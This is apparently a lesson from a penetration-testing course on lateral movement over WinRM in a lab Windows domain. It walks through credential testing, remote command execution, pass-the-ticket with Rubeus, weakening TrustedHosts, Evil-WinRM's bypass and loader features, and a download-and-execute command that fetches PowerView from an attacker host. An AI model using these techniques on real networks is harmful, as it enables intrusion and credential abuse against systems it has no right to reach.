
<h1>Windows Remote Management (WinRM)</h1>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/winrm/portal">Windows Remote Management (WinRM)</a> is Microsoft's version of the <a href="https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol">WS-Management (Web Services-Management) protocol</a>, a standard protocol for managing software and hardware remotely. WinRM facilitates the transfer of management data between computers, enabling administrators to perform a variety of tasks, such as running scripts and retrieving event data from remote systems.</p>
<p>WinRM is commonly used in conjunction with PowerShell for automation and administrative purposes, making it an indispensable tool for managing Windows environments. It provides a secure and efficient method to interact with remote systems, leveraging established web standards to ensure compatibility and flexibility. WinRM communication primarily utilizes TCP port <code>5985</code> for HTTP and <code>5986</code> for HTTPS.</p>
<p>In the context of lateral movement, as penetration testers, we exploit the inherent mechanisms built by Microsoft for remote administration. Rather than inventing new methods, we can abuse these native capabilities to execute arbitrary commands or gain access to additional systems. This approach aligns with how administrators legitimately manage remote computers.</p>
<h2>WinRM Rights</h2>
<p>To abuse WinRM for lateral movement, specific rights are required on the target system. While administrative privileges are often necessary, non-administrator accounts can also be granted with the required permissions to use WinRM. By default, members of the <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#remote-management-users">Remote Management Users</a> group have the necessary access. Additionally, certain configurations and policies can grant WinRM access to other users.</p>
<p>Identifying users with the rights to use WinRM involves checking group memberships, group policies, and testing credentials:</p>
<ul>
<li>
<code>Remote Management Users Group</code>: Members of this group inherently have the permissions needed to use WinRM.</li>
<li>
<code>Group Policies</code>: Review group policies that might grant WinRM access to specific users.</li>
<li>
<code>Testing Credentials</code>: Test if various credentials can successfully connect via WinRM using different tools to verify their validity and access rights.</li>
<li>
<code>Active Directory (AD)</code>: We can use tools such as BloodHound or LDAP queries to find users with WinRM rights.</li>
</ul>
<h2>WinRM Enumeration</h2>
<p>Before using WinRM for lateral movement, it is essential to determine which systems have WinRM enabled and accessible. Enumeration can be performed using various tools and scripts to identify targets. Let's use <code>nmap</code> to identify if the target has WinRM ports available:</p>
<pre><code class="language-shell-session">[!bash!]$ nmap -p5985,5986 10.129.229.244 -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 12:52 AST
Nmap scan report for 10.129.229.244
Host is up (0.13s latency).

PORT     STATE    SERVICE VERSION
5985/tcp open     http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp filtered wsmans
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre>
<p>To test credentials against WinRM, we can use <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a>. Let's select the account <code>frewdy</code> and the password <code>Kiosko093</code> and specify the protocol <code>winrm</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ netexec winrm 10.129.229.244 -u frewdy -p Kiosko093
WINRM       10.129.229.244  5985   SRV01            [*] Windows 10 / Server 2019 Build 17763 (name:SRV01) (domain:inlanefreight.local)
WINRM       10.129.229.244  5985   SRV01            [+] inlanefreight.local\frewdy:Kiosko093 (Pwn3d!)
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> Users with rights to connect to WinRM will be marked as <code>(Pwn3d!)</code> but that doesn't mean the user is member of the Administrators group. </p>
</div>
</div>
<p>To enumerate WinRM rights, we can use <a href="https://github.com/SpecterOps/BloodHound">BloodHound</a>. However, even if we use BloodHound, it will not query the local group members. The only way to check if an account has the rights to connect over WinRM is through testing. When we compromise an account, it is recommended that we try different ways to perform lateral movement.</p>
<h2>Lateral Movement From Windows</h2>
<p>We can use PowerShell to interact with WinRM on Windows. PowerShell has cmdlets such as <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.4">Invoke-Command</a> and <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.4">Enter-PSSession</a> to manage and execute commands on remote systems.</p>
<p>Let's connect via RDP to <code>SRV01</code> using Helen's credentials.</p>
<pre><code class="language-shell-session">[!bash!]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux
</code></pre>
<p>Now, we can explore how to use <code>Invoke-Command</code> to execute commands on a remote system. We need to launch a PowerShell session as the account we want to use to interact with the remote computer. In this case, we are using Helen's credentials, as this account is a member of <code>Remote Management Users</code> on <code>SRV02</code>.</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; Invoke-Command -ComputerName srv02 -ScriptBlock { hostname;whoami }
SRV02
inlanefreight\helen
</code></pre>
<p>Additionally, we can specify credentials with the <code>-Credential</code> parameter:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; $username = "INLANEFREIGHT\Helen"
PS C:\Tools&gt; $password = "RedRiot88"
PS C:\Tools&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Tools&gt; $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
PS C:\Tools&gt; Invoke-Command -ComputerName 172.20.0.52 -Credential $credential -ScriptBlock { whoami; hostname }
inlanefreight\helen
SRV02
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> If we use the IP instead of the computer name, we must use explicit credentials, or alternatively, we can use the flag <code>-Authentication Negotiate</code> instead of providing explicit credentials.</p>
</div>
</div>
<p><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs">winrs</a> (Windows Remote Shell) is a command line tool allowing to execute commands on a Windows machine using WinRM remotely. Here's an example of how to use <code>winrs</code> to execute a command on a remote server:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; winrs -r:srv02 "powershell -c whoami;hostname"
inlanefreight\helen
SRV02
</code></pre>
<p><code>winrs</code> also allow us to use explicit credentials with the options <code>/username:&lt;username&gt;</code> and <code>/password:&lt;password&gt;</code> as follow:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; winrs /remote:srv02 /username:helen /password:RedRiot88 "powershell -c whoami;hostname"
inlanefreight\helen
SRV02
</code></pre>
<h2>Copy Files</h2>
<p>PowerShell provides robust functionality for copying files between systems, which is especially useful during lateral movement. One effective way to achieve this is by using PowerShell remoting sessions over WinRM. This approach allows for secure and efficient file transfers between remote systems.</p>
<p>To copy files using a PowerShell session, you first need to establish a remote session with the target machine. This can be done using the <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.4">New-PSSession</a> cmdlet. Let's create a variable and name it <code>$sesionSRV02</code>:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; $sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential
</code></pre>
<p>Once the session is established, we can use the <code>Copy-Item</code> cmdlet to copy from or to the target machine. To copy a file in our current machine (SRV01) to the target machine (SRV02), we need to use the command <code>-ToSession &lt;sessionVariable&gt;</code> to specify the path of the file we want to transfer with the option <code>-Path &lt;local file&gt;</code> and the destination on the target machine with the option <code>-Destination &lt;path remote machine&gt;</code>:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; Copy-Item -ToSession $sessionSRV02 -Path 'C:\Users\helen\Desktop\Sample.txt' -Destination 'C:\Users\helen\Desktop\Sample.txt' -Verbose
VERBOSE: Performing the operation "Copy File" on target "Item: C:\Users\helen\Desktop\Sample.txt Destination: C:\Users\helen\Desktop\Sample.txt".
</code></pre>
<p>If we want to do the opposite and copy a file from the target machine, we need to use <code>-FromSession &lt;sessionVariable&gt;</code>:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; Copy-Item -FromSession $sessionSRV02 -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\Users\helen\Desktop\host.txt' -Verbose
VERBOSE: Performing the operation "Copy File" on target "Item: C:\Windows\System32\drivers\etc\hosts Destination: C:\Users\helen\Desktop\host.txt".
</code></pre>
<h3>Interactive Shell</h3>
<p>We can use the <code>Enter-PSSession</code> cmdlet for an interactive shell using PowerShell remoting. This cmdlet allows us to initiate an interactive session with the remote computer, either by using a session created with <code>New-PSSession</code>, specifying explicit credentials, or leveraging the current session where the command is executed. For instance, let's reuse the <code>$sessionSRV02</code> variable we previously created. Specifying the <code>Enter-PSSession</code> and the variable will give us an interactive PowerShell prompt on the remote computer, allowing us to execute commands as if we were logged in directly.</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; Enter-PSSession $sessionSRV02
[SRV02]: PS C:\Users\helen\Documents&gt;
</code></pre>
<h3>Using Hashes and Tickets with WinRM</h3>
<p>Additionally, we can also use kerberos tickets to connect to PowerShell remoting. To do this we will use <code>Rubeus</code>. First we need to forge our TGT. Let's use <code>Leonvqz</code> hash to forge a new ticket:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt;  .\Rubeus.exe asktgt /user:leonvqz /rc4:3223DS033D176ABAAF6BEAA0AA681400 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Got domain: inlanefreight.local
[*] Using rc4_hmac hash: 3223DS033D176ABAAF6BEAA0AA681400
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.local\leonvqz'
[*] Using domain controller: 172.20.0.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9hgg

  ServiceName              :  krbtgt/inlanefreight.local
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  leonvqz (NT_PRINCIPAL)
  UserRealm                :  INLANEFREIGHT.LOCAL
...SNIP...
</code></pre>
<p>Next, we need to create a sacrificial process with the option <code>createnetonly</code>.</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\Rubeus.exe createnetonly /program:powershell.exe /show
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : True
[*] Username        : SB09OE04
[*] Domain          : 16GFWBFF
[*] Password        : 5AB6RGSG
[+] Process         : 'powershell.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2088
[+] LUID            : 0xded959c
</code></pre>
<p>The above command will present us a PowerShell window with dummy credentials, we will use it to import the TGT of the account we want to use:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9h...SNIP...
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Import Ticket
[+] Ticket successfully imported!
</code></pre>
<p>Now we can use this session to connect to the target machine:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; Enter-PSSession SRV02.inlanefreight.local -Authentication Negotiate
[SRV02.inlanefreight.local]: PS C:\Users\Leonvqz\Documents&gt; hostname
SRV02
</code></pre>
<p>Now that we are connected to this machine, if we try to use this session to connect to a different target over the network, it won't work because of the <a href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/understanding-kerberos-double-hop/ba-p/395463">double hop problem</a>. A workaround is to use Rubeus within this session to forge a ticket and import it so we can use it for further authentication.</p>
<h3>Powershell Errors</h3>
<p>Depending on the context, we may get a PowerShell error while attempting to connect to a remote host from Windows. Those errors are typically related to rights, authentication method, network access, or TrustedHost configuration. In the following example, we got an error because we attempted to use the target machine's name instead of the FQDN. Sometimes, Kerberos won't work unless we use the FQDN.</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; Enter-PSSession srv02
Enter-PSSession : Processing data from remote server srv02 failed with the following error message: WinRM cannot
process the request. The following error with errorcode 0x80090322 occurred while using Kerberos authentication: An
unknown security error occurred.
 Possible causes are:
  -The user name or password specified are invalid.
  -Kerberos is used when no authentication method and no user name are specified.
  -Kerberos accepts domain user names, but not local user names.
  -The Service Principal Name (SPN) for the remote computer name and port does not exist.
  -The client and remote computers are in different domains and there is no trust between the two domains.
 After checking for the above issues, try the following:
  -Check the Event Viewer for events related to authentication.
  -Change the authentication method; add the destination computer to the WinRM TrustedHosts configuration setting or
use HTTPS transport.
 Note that computers in the TrustedHosts list might not be authenticated.
   -For more information about WinRM configuration, run the following command: winrm help config. For more
information, see the about_Remote_Troubleshooting Help topic.
At line:1 char:1
+ Enter-PSSession srv02
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (srv02:String) [Enter-PSSession], PSRemotingTransportException
    + FullyQualifiedErrorId : CreateRemoteRunspaceFailed
</code></pre>
<p>We can try to use the FQDN instead:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; Enter-PSSession srv02.inlanefreight.local
[srv02.inlanefreight.local]: PS C:\Users\Helen\Documents&gt;
</code></pre>
<p>Additionally, we can get a <code>TrustedHosts</code> error as follow:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; Enter-PSSession srv02 -Authentication Negotiate
Enter-PSSession : Connecting to remote server srv02 failed with the following error message : The WinRM client cannot
process the request.  Default credentials with Negotiate over HTTP can be used only if the target machine is part of
the TrustedHosts list or the Allow implicit credentials for Negotiate option is specified. For more information, see
the about_Remote_Troubleshooting Help topic.
At line:1 char:1
+ Enter-PSSession srv02 -Authentication Negotiate
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (srv02:String) [Enter-PSSession], PSRemotingTransportException
    + FullyQualifiedErrorId : CreateRemoteRunspaceFailed
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> Keep in mind that using <code>-Authentication Negotiate</code>  will select either Kerberos or NTLM as the underlying authentication mechanism based on what both the client and server support and prefer. It is good to use this flag if we are having authentication issues. </p>
</div>
</div>
<p>To solve this issue we can use the following command:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; Set-Item WSMan:localhost\client\trustedhosts -value * -Force
</code></pre>
<p>If we are not admins, we can use explicit credentials with <code>-Credential</code> or <code>Invoke-Command</code>.</p>
<h2>Just Enough Administration (JEA)</h2>
<p><a href="https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview?view=powershell-7.4">Just Enough Administration (JEA)</a> is a security technology designed to provide delegated administration capabilities for tasks managed with PowerShell. JEA helps mitigate security risks by allowing administrators to limit the scope of administrative privileges. By using JEA, administrators can ensure that users have only the permissions necessary to perform specific tasks, reducing the attack surface and minimizing the risk of accidental or intentional misuse of administrative privileges.</p>
<p>JEA is particularly useful in environments where least privilege principles are critical. It allows organizations to create PowerShell endpoints with tailored roles and capabilities, ensuring users can only execute predefined commands and access specific resources. This approach enhances security and simplifies compliance with organizational policies and regulatory requirements by ensuring that administrative actions are tightly controlled and auditable. For more in-depth discussions on JEA and its potential abuses, we can explore resources such as <a href="https://www.scriptjunkie.us/2016/10/just-too-much-administration-breaking-jea-powershells-new-security-barrier/">Just Too Much Administration – Breaking JEA, PowerShell’s New Security Barrier</a> and <a href="https://securityaffairs.com/52084/hacking/jea-profiles-abuses.html">Breaking The Microsoft Jea Technology To Hack A System</a></p>
<h2>Lateral Movement From Linux</h2>
<p>Interacting with WinRM from a Linux system can be accomplished using various tools and libraries that support the WinRM protocol. In this section we will focus on <code>NetExec</code> and <code>Evil-WinRM</code>.</p>
<h3>NetExec</h3>
<p>With <code>NetExec</code> we can use the option <code>-x</code> or <code>-X</code> to execute CMD or PowerShell commands. For example, to execute a basic command like <code>ipconfig</code> we can use the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ netexec winrm 10.129.229.244 -u frewdy -p Kiosko093 -x "ipconfig"
WINRM       10.129.229.244  5985   SRV01            [*] Windows 10 / Server 2019 Build 17763 (name:SRV01) (domain:inlanefreight.local)
WINRM       10.129.229.244  5985   SRV01            [+] inlanefreight.local\frewdy:Kiosko093 (Pwn3d!)
WINRM       10.129.229.244  5985   SRV01            [-] Execute command failed, current user: 'inlanefreight.local\frewdy' has no 'Invoke' rights to execute command (shell type: cmd)
WINRM       10.129.229.244  5985   SRV01            [+] Executed command (shell type: powershell)
WINRM       10.129.229.244  5985   SRV01            
WINRM       10.129.229.244  5985   SRV01            Windows IP Configuration
WINRM       10.129.229.244  5985   SRV01            
WINRM       10.129.229.244  5985   SRV01            
WINRM       10.129.229.244  5985   SRV01            Ethernet adapter Ethernet1:
WINRM       10.129.229.244  5985   SRV01            
WINRM       10.129.229.244  5985   SRV01            Connection-specific DNS Suffix  . :
WINRM       10.129.229.244  5985   SRV01            Link-local IPv6 Address . . . . . : fe80::206d:76ce:27d6:960b%7
WINRM       10.129.229.244  5985   SRV01            IPv4 Address. . . . . . . . . . . : 172.20.0.51
WINRM       10.129.229.244  5985   SRV01            Subnet Mask . . . . . . . . . . . : 255.255.255.0
WINRM       10.129.229.244  5985   SRV01            Default Gateway . . . . . . . . . 
</code></pre>
<h3>Using Evil-WinRM</h3>
<p><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> is a Ruby-based tool that facilitates interaction with WinRM from Linux. It offers a straightforward interface for executing commands and managing Windows systems remotely.</p>
<p>To install <code>evil-winrm</code>, we need to have Ruby installed. On Debian-based systems, we can install Ruby using the following commands:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo apt-get install ruby
</code></pre>
<p>Once Ruby is installed, we can proceed to install <code>evil-winrm</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo gem install evil-winrm       
Fetching little-plugger-1.1.4.gem      
Fetching nori-2.7.0.gem
Fetching httpclient-2.8.3.gem
Fetching rubyntlm-0.6.3.gem
Fetching logging-2.3.1.gem    
Fetching builder-3.2.4.gem  
Fetching gyoku-1.4.0.gem      
Fetching gssapi-1.3.1.gem
</code></pre>
<p>Once installed, we can use <code>evil-winrm</code> to connect to a remote Windows machine and execute commands. We must specify the option <code>-i &lt;target&gt;</code> and the credentials with the options <code>-u '&lt;domain&gt;\&lt;user&gt;'</code> for users and for password <code>-p &lt;password&gt;</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093

Evil-WinRM shell v3.5
...SNIP...
*Evil-WinRM* PS C:\Users\frewdy\Documents&gt; hostname;whoami
SRV01
inlanefreight\frewdy
</code></pre>
<p>Additionally, <code>evil-winrm</code> comes with features that facilitate interaction with remote systems and bypass common security mechanisms. We can get access to the features using the <code>menu</code> command from the interactive shell:</p>
<pre><code class="language-shell-session">[!bash!]$ 
*Evil-WinRM* PS C:\Users\frewdy\Documents&gt; menu


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
</code></pre>
<h3>Loading PowerShell Scripts and more</h3>
<p><code>Evil-WinRM</code> allows us to load PowerShell scripts. We must specify the <code>-s &lt;PATH&gt;</code> option and, within that path, save the scripts we want to import. We need to specify the file's name to import a script to the Evil-WinRM shell. In this example, we have downloaded <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">PowerView.ps1</a>, and we will import it.</p>
<pre><code class="language-shell-session">[!bash!]$ evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093 -s '/home/plaintext/'
*Evil-WinRM* PS C:\Users\frewdy\Documents&gt; PowerView.ps1
*Evil-WinRM* PS C:\Users\frewdy\Documents&gt; menu
                                         
                                         
   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)        
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \      
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Add-DomainGroupMember 
[+] Add-DomainObjectAcl 
[+] Add-RemoteConnection
</code></pre>
<p>In the above command, we established a session and invoked <code>PowerView.ps1</code> because <code>PowerView.ps1</code> is located at <code>/home/plaintext</code>. Next, we executed the <code>menu</code> command, which displayed not only the default menu options but also the cmdlets available since we imported PowerView.</p>
<p>Additionally, we can also load DLLs or <a href="https://github.com/TheWover/donut">Donut</a> payloads.</p>
<h2>Windows PowerShell Web Access</h2>
<p>It is also possible that the Administrator configures <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831611(v=ws.11)">Windows PowerShell Web Access</a>, which provides a web-based interface for accessing PowerShell sessions remotely. This feature allows users to run PowerShell commands and scripts from a web browser, offering flexibility and convenience for remote management tasks. Accessing PowerShell through a web portal allows users to perform administrative tasks on remote systems without needing a direct remote desktop connection or VPN access.</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/pswa.png"/></p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> By default the URL path for PowerShell Web Access is <code>/pswa</code> and the port will be 80 or 443. The web directory and port can be changed. </p>
</div>
</div>
<p>Valid credentials are required to authenticate with PowerShell remoting. These credentials must have appropriate permissions on the target system to initiate and execute remote PowerShell commands. Depending on the configuration, this could involve standard user accounts or accounts with elevated privileges, such as those belonging to the <code>Remote Management Users</code> group or local <code>Administrators</code>.</p>
<p>To connect to PowerShell Web Access using Frewdy's credentials, let's connect to https://10.129.229.244/pswa:</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/pswa-login.png"/></p>
<p>When working with PowerShell Web Access and needing to retrieve large amounts of information, we should consider using <code>Base64</code> output to optimize the process. PowerShell Web Access connects to the target machine to retrieve each line, meaning it may take much time to retrieve a large file if we are on a slow network.</p>
<p>For example, if we try to get the contents of <code>C:\Windows\System32\drivers\etc\hosts</code> using <code>cat</code>, it will take some time to load due to the line-by-line transfer. Instead, we can use the following command to convert the file contents to Base64:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\System32\drivers\etc\hosts"))
</code></pre>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/pswa-base64.png"/></p>
<p>This will load faster. We can then copy that content to a file, replace the break lines, and use <code>cat hosts_base64.txt | base64 -d &gt; hosts</code> in a Linux terminal to decode the content quickly.</p>
<p>In case we want to use <code>PowerView</code> through <code>PowerShell Web Access</code> we may get the following error:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.87/PowerView.ps1')
PS C:\Tools&gt; Get-DomainUser
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At line:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
 + FullyQualifiedErrorId : DirectoryServicesCOMException
</code></pre>
<p>To prevent this from happening, we must specify our credentials as follows:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; $username = "INLANEFREIGHT\Helen"
PS C:\Tools&gt; $password = "RedRiot88"
PS C:\Tools&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Tools&gt; $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
PS C:\Tools&gt; Get-DomainUser -Credential $credential -FindOne

logoncount                    : 1100
badpasswordtime               : 6/27/2024 6:32:03 AM
description                   : Built-in account for administering the computer/domain
distinguishedname             : CN=Administrator,CN=Users,DC=inlanefreight,DC=local
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 6/30/2024 6:21:56 AM
name                          : Administrator
lockout time                   : 0
objectsid                     : S-1-5-21-2760730334-3436498779-657182845-500
samaccountname                : Administrator
logonhours                    : {255, 255, 255, 255...}
...SNIP...
</code></pre>
<h2>Conclusion</h2>
<p>WinRM is a crucial tool for remote management and automation in Windows environments, allowing secure and efficient interaction with remote systems. By understanding and utilizing the necessary rights and enumeration techniques, we can exploit WinRM to execute commands, transfer files, and gain access to additional systems.</p>
<p>In the next section, we will explore the use of DCOM (Distributed Component Object Model) for lateral movement, detailing how it can be used to gain access and execute commands on remote systems.</p>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-success '&gt;low Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="29" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="36" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="38" selected="" value="2">EU Academy 2</option>
